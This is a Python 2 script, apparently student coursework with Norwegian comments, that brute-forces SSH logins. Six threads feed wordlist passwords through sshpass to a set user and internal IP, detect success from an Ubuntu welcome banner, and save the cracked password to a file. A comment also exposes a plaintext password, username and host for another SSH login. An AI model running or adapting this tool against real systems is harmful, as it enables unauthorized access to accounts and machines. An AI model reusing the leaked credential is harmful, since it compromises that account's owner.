#!/usr/bin/env python
# coding=utf-8
# 32-126 : 20-7E
# Tråder: https://docs.python.org/2/library/threading.html
# Queue: https://www.troyfawkes.com/learn-python-multithreading-queues-basics/
import thread
import threading
import commands

p = 1
USERNAME = "chrisb14"
IP_ADRESS = "172.16.0.30"
PORT = "22"
new_results = []
correct_pw = ""
cracked = bool(False)
counter = 0
# sshpass -p bkdrugis ssh Sigurdkb@10.225.147.156 -p 2222

def connect_ssh():
        global correct_pw
        global cracked

        while cracked == False:
            pw = get_next_pw()
            # Lagrer resultatene fra kommando i variabel
            result = commands.getoutput("sshpass -p " +  pw + " ssh "+ USERNAME + "@" + IP_ADRESS + " -p " + PORT)

            # Dersom result inneholder permission denied prøver tråden neste passord
            if result.__contains__("Permission denied"):
                print "Password try: " + pw
            elif result.__contains__("Welcome") & result.__contains__("Ubuntu"): # Fra IS-105 UH-IAAS (samme velkomst (også Ubuntu-server))
                print "Correct password: " + pw
                correct_pw = pw
                f = open("correct_pw.txt", 'w')
                f.write(correct_pw)
                thread.interrupt_main()
                cracked = True

            else:
            # Dersom result ikke ennholder permission denied legger den passordet i en liste sammen med andre passord som ligger der av samme grunn
                print "Passord som gav nytt resultat: " + pw
                print " Output: " + result
                new_results.append(pw)
                print new_results


# Funksjon for å fordele passordene i noenlunde like lister (sekvensielt)
# Legg til nye lister og nye if-setninger for å fordele passordene på flere lister (dersom flere tråder ønskes)



# Leser fil og legger hver linje som et nytt element i lista (som blir delt opp i metoden over.)
def get_next_pw():
    global counter

    file = open("wordlist.txt", "r")
    line = file.readlines()[counter]
    counter += 1
    return line.strip('\n')


# Henter lister og starter tråder
def main():

    # Trådene kjører samme metode, men med hver sin liste. Alle kombinasjoner (5 chars totalt (lower case alfabet)) blir testet.
    t1 = threading.Thread(target=connect_ssh)
    t2 = threading.Thread(target=connect_ssh)
    t3 = threading.Thread(target=connect_ssh)
    t4 = threading.Thread(target=connect_ssh)
    t5 = threading.Thread(target=connect_ssh)
    t6 = threading.Thread(target=connect_ssh)

    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()

    t1.join()
    t2.join()
    t3.join()
    t4.join()
    t5.join()
    t6.join()

main()



